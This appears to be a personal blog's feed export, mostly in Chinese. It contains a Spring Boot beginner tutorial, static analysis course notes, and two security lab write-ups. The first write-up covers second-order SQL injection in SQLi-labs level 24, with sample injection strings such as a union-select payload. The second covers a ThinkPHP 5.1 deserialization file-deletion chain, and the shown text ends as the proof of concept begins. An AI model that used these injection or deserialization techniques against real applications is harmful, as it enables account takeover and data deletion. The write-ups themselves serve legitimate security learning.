class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法二：-网站下载"><a href="#方法二：-网站下载" class="headerlink" title="方法二： 网站下载"></a>方法二： 网站下载</h4><p>通过<a href="https://start.spring.io/">Spring Initilizr</a>配置好下载就行了。</p>
<h4 id="方法三：通过IDEA新建（和方法二差不多）"><a href="#方法三：通过IDEA新建（和方法二差不多）" class="headerlink" title="方法三：通过IDEA新建（和方法二差不多）"></a>方法三：通过IDEA新建（和方法二差不多）</h4><p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716234423763.png" alt="image-20210716234423763"></p>
<h3 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h3><p>有时候，如果我们依赖文件导入到一半中止，这时候会有一些错误，那么我们可以用一个清理Maven仓库的脚本, 修改一下仓库路径，然后保存为<code>.bat</code>文件，双击即可清理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">rem create by NettQun</span><br><span class="line">rem 这里写你的仓库路径</span><br><span class="line"><span class="built_in">set</span> REPOSITORY_PATH=E:\Develop\maven_rep</span><br><span class="line">rem 正在搜索...</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%i <span class="keyword">in</span> (<span class="string">&#x27;dir /b /s &quot;%REPOSITORY_PATH%\*lastUpdated*&quot;&#x27;</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> %%i</span><br><span class="line">del /s /q <span class="string">&quot;%%i&quot;</span></span><br><span class="line">)</span><br><span class="line">rem 搜索完毕</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<h2 id="一个简易的Hello-World"><a href="#一个简易的Hello-World" class="headerlink" title="一个简易的Hello World"></a>一个简易的Hello World</h2><h3 id="Application和Controller"><a href="#Application和Controller" class="headerlink" title="Application和Controller"></a>Application和Controller</h3><p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716234550092.png" alt="image-20210716234550092"></p>
<p>在<code>src-main-java</code>下新建一个<code>package</code>，然后新建我们的<code>HelloApplication Class</code>，再新建一个<code>Controller package</code> 来存放我们的<code>Controller classes</code>,需要注意的是，<strong>我们的<code>Controller Class</code>必须放在<code>application class</code>的子目录里</strong>。注意，通过<code>Spring Initilizr</code>网站上直接下载的直接就有这些<code>class</code>了。</p>
<p><code>Application Class</code>的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Controller</code>的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@Controller</span></span><br><span class="line"><span class="comment">//@ResponseBody 结果返回到响应体，如果没有的话是会返回到新的页面</span></span><br><span class="line"><span class="meta">@RestController</span><span class="comment">//相当于Controller+responseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span><span class="comment">//this is to deal with the request of &quot;/hello&quot;</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RestController"><a href="#RestController" class="headerlink" title="RestController"></a>RestController</h3><p><code>Controller Class</code>需要加上<code>@Controller</code></p>
<p>如果要让数据返回到<code>response body</code>中<img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716235326711.png" alt="image-20210716235326711">，需要使用<code>@ResponseBody</code></p>
<p><code>@RestController</code> 相当于 <code>@Controller+@ResponseBody</code>，所以我们也可以直接用这个代替</p>
<p><code>@RequestMapping</code>表示处理请求</p>
<h2 id="jar打包运行"><a href="#jar打包运行" class="headerlink" title="jar打包运行"></a>jar打包运行</h2><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p><code>pom.xml</code>中加入以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 可以使用mavin插件 可以用来打包 --&gt;</span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line"></span><br><span class="line">&lt;/build&gt;</span><br></pre></td></tr></table></figure>

<p>然后在Idea右侧的<code>Maven</code>中双击<code>package</code>即可</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>在<code>target</code>文件夹中可找到我们生成的<code>jar</code>文件，在当前文件所在目录的<code>cmd</code>中用<code>java -jar filename</code>运行起来即可</p>
<h2 id="版本锁定"><a href="#版本锁定" class="headerlink" title="版本锁定"></a>版本锁定</h2><p>Spring Boot所继承的<code>spring-boot-starter-parent</code>这个副工程为我们对常用的依赖进行了版本锁定(在父工程的<code>pom.xml</code>文件中)。</p>
<p>我们可以通过直接指定版本号（在我们的<code>pom.xml</code>）和覆盖<code>properties</code>配置来修改依赖的版本(在父工程的<code>pom.xml</code>文件中)。。</p>
<h2 id="Starter机制"><a href="#Starter机制" class="headerlink" title="Starter机制"></a>Starter机制</h2><p>一个starter针对一种特定的场景，内部引用了该场景所需要的依赖，所以我们不需要单独引入多个依赖。</p>
<blockquote>
<p>命名规律<br>官方starter都是以 spring-boot-starter 开头后面跟上场景名称。例如：spring-boot-starterdata-jpa<br>非官方starter则是以 场景名-spring-boot-starter 的格式，例如：mybatis-spring-boot-starter</p>
</blockquote>
<p><strong>非官方</strong>的starter是不会被<code>Spring Boot</code>的父工程进行版本指定的，所以我们需要指定<code>version</code></p>
<h2 id="YAML文件配置（重要）"><a href="#YAML文件配置（重要）" class="headerlink" title="YAML文件配置（重要）"></a>YAML文件配置（重要）</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>YAML是以<code>yml</code>为后缀的文件，用来完成XML所完成的任务，易于阅读且简单明了。<code>yaml</code>文件应该放在<code>resources</code>文件夹中，如<code>application.yml</code></p>
<h3 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h3><ul>
<li><p><code>key: value</code>冒号后面必须有一个空格</p>
</li>
<li><p>用空格的缩进表示层级关系，<strong>空格数目不重要，只要是左对齐的一列数据，都是同一个层级的</strong></p>
</li>
<li><p>缩进时不允许使用<code>TAB</code>键，只允许用<strong>空格</strong></p>
</li>
<li><p>命名时，<code>lastName和last-name都可以</code></p>
</li>
</ul>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name1:</span> <span class="string">sangeng//可以不用引号</span></span><br><span class="line"><span class="comment">#单引号中\n不起作用</span></span><br><span class="line"><span class="attr">name2:</span> <span class="string">&#x27;sangeng \n caotang&#x27;</span></span><br><span class="line"><span class="comment">#双引号中\n要起作用</span></span><br><span class="line"><span class="attr">name3:</span> <span class="string">&quot;sangeng \n caotang&quot;</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">15</span></span><br><span class="line"><span class="attr">flag:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021</span><span class="string">/07/16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#object的attribute和value,也可代表Map：</span></span><br><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leihehe</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">21</span></span><br><span class="line"><span class="comment">#如果要写成一行，如下:</span></span><br><span class="line"><span class="attr">student:</span> &#123;<span class="attr">name:</span> <span class="string">leihehe</span>,<span class="attr">age:</span> <span class="number">21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#数组、list、set:</span></span><br><span class="line"><span class="attr">pets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pig</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line"><span class="comment">#list如果要写成一行，如下：</span></span><br><span class="line"><span class="attr">pets:</span> &#123;<span class="string">dog</span>,<span class="string">pig</span>,<span class="string">cat</span>&#125;</span><br><span class="line"><span class="comment">#数组写成一行，如下：</span></span><br><span class="line"><span class="attr">pets:</span> [<span class="string">dog</span>,<span class="string">pig</span>,<span class="string">cat</span>]</span><br><span class="line"><span class="comment">#修改服务器端口,如果myPort没有被设置，就会被设为88</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">	<span class="attr">port:</span> <span class="string">$&#123;myPort:88&#125;</span></span><br><span class="line"><span class="attr">myPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<h3 id="Spring-Boot读取YML"><a href="#Spring-Boot读取YML" class="headerlink" title="Spring Boot读取YML"></a>Spring Boot读取YML</h3><h4 id="Value注解"><a href="#Value注解" class="headerlink" title="@Value注解"></a>@Value注解</h4><p>该注解只能获取简单类型的值（8种基本数据类型以及其包装类，String，Date）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span><span class="comment">//此处从yaml文件中读取到name的值，并赋值给下面的变量</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;student.age&#125;&quot;)</span><span class="comment">//从student这个object中获取age的值，并赋值给下面的变量</span></span><br><span class="line">	<span class="keyword">private</span> String age;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/age&quot;)</span><span class="comment">//处理/age访问请求</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">age</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span><span class="comment">//处理/test访问请求</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;<span class="comment">//返回name</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>加了<code>@Value</code>的Class必须要交由Spring容器管理，如此处的<code>@RestController</code></strong></p>
<h4 id="ConfigurationProperties-注解-与Lombok插件"><a href="#ConfigurationProperties-注解-与Lombok插件" class="headerlink" title="@ConfigurationProperties 注解 与Lombok插件"></a>@ConfigurationProperties 注解 与Lombok插件</h4><p><strong>使用<code>@ConfigurationProperties</code>的Class必须要交由Spring容器管理。</strong></p>
<p><code>yml</code>文件中：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student2:</span> &#123;<span class="attr">name:</span> <span class="string">jack</span>,<span class="attr">age:</span> <span class="number">21</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>Student Class</code>中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span><span class="comment">//根据我们的attribute帮我们生成set/get方法</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span><span class="comment">//生成空参constructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span><span class="comment">//生成传参constructor</span></span><br><span class="line"><span class="comment">//以上都是Lombok插件的作用</span></span><br><span class="line"><span class="meta">@Component</span><span class="comment">//把该类交给Spring容器管理</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;student2&quot;)</span><span class="comment">//设置前缀</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//此处的attribute必须和yaml file里的key名字一样才可以赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"><span class="comment">//attribute会自动被赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>要求对应的属性要有set/get方法</strong>，而此处我们用<code>Lombok</code>这个依赖帮我们自动完成这件事，所以我们不需要手动生成<code>set/get</code>方法</p>
<p>当然，我们还需要<strong>安装Lombok 插件</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>HelloController</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span><span class="comment">//因为创建Student类的instance，所以用autowired可以自动注入，从Spring容器中获取数据,赋值给下面的变量</span></span><br><span class="line"><span class="keyword">private</span> Student student;</span><br></pre></td></tr></table></figure>

<h4 id="ConfigurationProperties-配置提示"><a href="#ConfigurationProperties-配置提示" class="headerlink" title="@ConfigurationProperties 配置提示"></a>@ConfigurationProperties 配置提示</h4><p>另外，如果我们使用了<code>@ConfigurationProperties</code>注解，我们可以增加如下依赖，这样在写配置的时候会有提示</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>重启idea即可</strong></p>
<h3 id="YML和Properties转换"><a href="#YML和Properties转换" class="headerlink" title="YML和Properties转换"></a>YML和Properties转换</h3><p><code>application.yml</code>需要改成<code>application.properties</code></p>
<p><a href="https://www.toyaml.com/index.html">在线yaml转properties</a></p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="依赖冲突"><a href="#依赖冲突" class="headerlink" title="依赖冲突"></a>依赖冲突</h3><h4 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h4><blockquote>
<p>A依赖B（低版本）</p>
<p>C依赖B（高版本）</p>
</blockquote>
<p>若你先引入A，那么低版本的B会被引入，再引入C后，C就找不到高版本的B，就会出现依赖冲突</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>下载<code>Maven Helper</code>插件，重启<code>idea</code>后，打开<code>pom.xml</code>,下面就有<code>Dependency  Analyzer</code>，<code>refresh</code>后可以找到冲突项，然后选择低版本的，右键<code>exclude</code>，再次刷新后问题解决。</p>
<h4 id="修改依赖后如何生效？"><a href="#修改依赖后如何生效？" class="headerlink" title="修改依赖后如何生效？"></a>修改依赖后如何生效？</h4><p>很简单，右上角有一个Maven的图标，load一下change就好了</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程</p>
]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL二次注入填坑(Sqlilab 第24关)</title>
    <url>/2021/07/06/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%A1%AB%E5%9D%91-Sqlilab-%E7%AC%AC24%E5%85%B3/</url>
    <content><![CDATA[<h1 id="SQL二次注入填坑-Sqlilab-第24关"><a href="#SQL二次注入填坑-Sqlilab-第24关" class="headerlink" title="SQL二次注入填坑(Sqlilab 第24关)"></a>SQL二次注入填坑(Sqlilab 第24关)</h1><p>在练习sql注入的时候我有一个不好的习惯，就是总是看别人的提示，没有给自己养成一个自我思考、尝试的习惯。所以这次决定把每一步思路都记录下来，自己尝试。</p>
<span id="more"></span>

<h2 id="尝试登录POST注入（失败）"><a href="#尝试登录POST注入（失败）" class="headerlink" title="尝试登录POST注入（失败）"></a>尝试登录POST注入（失败）</h2><p>先尝试了黑盒测试，各种注入都不报错，然后去代码审计，在Login.php里，可以看到<img src="/image/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%A1%AB%E5%9D%91-Sqlilab-%E7%AC%AC24%E5%85%B3/image-20210706183658126.png" alt="image-20210706183658126"></p>
<p><code>username</code> 和 <code>password</code>都被<strong>mysql_real_escape_string</strong>做了处理，所以登录POST处的注入就不再想了</p>
<h2 id="尝试二次注入（成功）"><a href="#尝试二次注入（成功）" class="headerlink" title="尝试二次注入（成功）"></a>尝试二次注入（成功）</h2><h3 id="修改其他用户密码"><a href="#修改其他用户密码" class="headerlink" title="修改其他用户密码"></a>修改其他用户密码</h3><p>在post注入行不通后，我发现可以创建新用户和登录</p>
<p>随便创建了一个用户：<code>username:123,密码123456</code>，登录后发现有需改密码选项，所以猜测修改密码选项的语句是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Update users set password = <span class="string">&#x27;111&#x27;</span> where username = <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password = <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这里的<code>username</code>可能是存在注入的，但因为创建用户的时候，我们的<code>username</code>和<code>password</code>都被转义过了，该怎么办呢？</p>
<p>实际上，因为这个创建用户时的转移函数<code>mysql_real_escape_string()</code>会在引号前加入反斜杠<code>\</code>, 比如<code>admin&#39;#</code> 会变成<code>admin\&#39;#</code>， 但存入数据库的时候,数据库会自动移除<code>\</code>,所以存进数据库的还是<code>admin&#39;#</code></p>
<p>那么回到刚才<strong>修改密码</strong>的语句，当我们进行修改密码的时候，语句会变为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Update users set password = <span class="string">&#x27;123&#x27;</span> where username = <span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password = &#x27;123&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>所以虽然我们登录的是<code>admin&#39;#</code>这个账号，但却修改了<code>admin</code>的密码</p>
<h3 id="扩散思维"><a href="#扩散思维" class="headerlink" title="扩散思维"></a>扩散思维</h3><p>既然二次注入可以利用，那么我们可以利用这个干点别的事</p>
<p>假设：如果我们现在php页面上有一个打印所有user信息的user表，我们甚至可以直接用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,user(),database()#</span><br></pre></td></tr></table></figure>

<p>把信息union到打出来的这张表上。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到<strong>转义</strong>的函数如<code>mysql_real_escape_string()</code>，考虑数据进入数据库后会被还原的情况，再找取出这个数据的地方，即可完成二次注入。</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>Static Analysis Notes</title>
    <url>/2021/12/20/Static-Analysis-Notes/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>By chance, I found a course called Static Analysis taught by Nanjing University professors. There are a lot of recommendations on how to learn this course and most of them coming down to this - watching the relative videos - Static Analysis is being a major trend. </p>
<p>I searched for Monash University’s static analysis courses online and found they offer some of these courses. Sadly, they are graduate courses or research projects, so I do not have the opportunity to apply.</p>
<p>Static analysis techniques have been used to assess the security of applications as well as to verify a program’s properties. For easy understanding, my notes are being written in English, and I hope to cover the most important concepts of the entire Static analysis learning process.</p>
<span id="more"></span>

<h1 id="S1-Introduction"><a href="#S1-Introduction" class="headerlink" title="S1 Introduction"></a>S1 Introduction</h1><h2 id="Sound-amp-Truth"><a href="#Sound-amp-Truth" class="headerlink" title="Sound &amp; Truth"></a>Sound &amp; Truth</h2><blockquote>
<p>TP True Positive: found a real error</p>
<p>FP False Positive: false alarm </p>
<p>TN True Negative: no error, no alarm—OK </p>
<p>FN False Negative: missed error</p>
</blockquote>
<p>Sound: no false negatives - no missed error</p>
<p>Complete: no false positive - no false alarm</p>
<p>Mostly compromising completeness: We prefer <strong>sound</strong> but not fully-precise static analysis.</p>
<h2 id="Abstraction-amp-over-approximation"><a href="#Abstraction-amp-over-approximation" class="headerlink" title="Abstraction &amp; over-approximation"></a>Abstraction &amp; over-approximation</h2><p>Abstraction is used for representing results using an abstract value.</p>
<p>Transfer functions define how to evaluate different program statements on abstract values.</p>
<p>Transfer functions are defined according to “analysis problem” and the “semantics” of different program statements.</p>
<p><strong>An example</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220163142471.png" alt="image-20211220163142471"></p>
<p>Over-approximation may produce false positives.</p>
<h2 id="Self-checking"><a href="#Self-checking" class="headerlink" title="Self-checking"></a>Self-checking</h2><ul>
<li>What are the differences between static analysis and (dynamic) testing?</li>
<li>Understand soundness, completeness, false negatives and false positives.</li>
<li>Why soundness is required by static analysis?</li>
<li>How to understand abstraction and over-approximation?</li>
</ul>
<h1 id="S2-Intermediate-Representation"><a href="#S2-Intermediate-Representation" class="headerlink" title="S2 Intermediate Representation"></a>S2 Intermediate Representation</h1><p>Intermediate Representation = IR</p>
<h2 id="Compilers-and-Static-Analyzers"><a href="#Compilers-and-Static-Analyzers" class="headerlink" title="Compilers and Static Analyzers"></a>Compilers and Static Analyzers</h2>]]></content>
      <categories>
        <category>Development</category>
        <category>Static Analysis</category>
      </categories>
      <tags>
        <tag>Static Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.1反序列化漏洞复现</title>
    <url>/2021/07/08/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大概练习了下一些简单的PHP反序列化漏洞以后，决定尝试一下漏洞复现。正好做CTF的时候看到了<code>ThinkPHP</code>反序列化漏洞的复现题，结果因为一些很小的问题（还是经验不足）废了很多很多时间，踩了很多坑，当然最后也收获了很多，对<strong>php反序列化漏洞</strong>有了新的认识。</p>
<p>看了下README，<img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708232435849.png" alt="image-20210708232435849">得知是5.1版本的，网上有各个师父的WP，看了很久终于搞明白了。</p>
<span id="more"></span>

<h1 id="PHP审计环境安装"><a href="#PHP审计环境安装" class="headerlink" title="PHP审计环境安装"></a>PHP审计环境安装</h1><p>为了方便，参考网上的资料后，我在windows系统上安装了<code>XAMPP</code>和<code>PhpStorm</code>,<code>PhpStrom</code>的配置就不说了，具体参考<a href="https://www.jianshu.com/p/eff16205d453">PHPstorm配置PHP运行环境</a>，不过我在配置运行的时候遇到很多坑，比如在某个php文件点击运行的时候，右上角设置的<code>configuration</code>会自动改变，导致我以为网站运行不起来。不过<code>PhpStorm</code>还是挺好用的，英语输入法下<code>ctrl+shift+f</code>可全局搜索关键词（这个快捷键会自动转换成windows系统拼音的繁体）</p>
<h1 id="任意文件删除漏洞复现"><a href="#任意文件删除漏洞复现" class="headerlink" title="任意文件删除漏洞复现"></a>任意文件删除漏洞复现</h1><h2 id="发现、分析过程"><a href="#发现、分析过程" class="headerlink" title="发现、分析过程"></a>发现、分析过程</h2><p>拿到源码的第一件事，我是搜索<code>unserialize</code>,后来在<code>index.php</code>发现了<img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708234233838.png" alt="image-20210708234233838">，所以我们可以通过<code>POST</code>请求来发送恶意代码。</p>
<p>接下来全局搜索魔法函数 <code>__destruct</code>,出现了四个结果</p>
<p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708234436994.png" alt="image-20210708234436994"></p>
<p>发现只有Windows.php下的函数有利用价值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();<span class="comment">//此处是个好东西</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>removeFiles()</code>之后，发现该方法依然在windows这个class里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;<span class="comment">//发现用到了$files这个attribute</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;<span class="comment">//检测如果这个文件存在</span></span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);<span class="comment">//则删除这个文件</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味着我们可以构造$files，让他执行<code>removeFiles()</code>来删除任意文件</p>
<h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>坑点一：需要注意的是，我们需要使用与Windows类相同的namespace（命名空间），我没加，导致在这卡了好久好久。</p>
<p>坑点二：序列化后的对象用<code>file_put_contents()</code>打出来乱码，发现是加了<code>namespace</code>后就会乱码，具体原因没有深入探究，改用echo就好了。</p>
<p>坑点三：加入<code>namespace</code>后，private类型attribute的格式发生了变化，变成了<code>%00namespace\类名\%00属性名</code>，一个小诀窍，记不住可以右键–查看网页源代码</p>
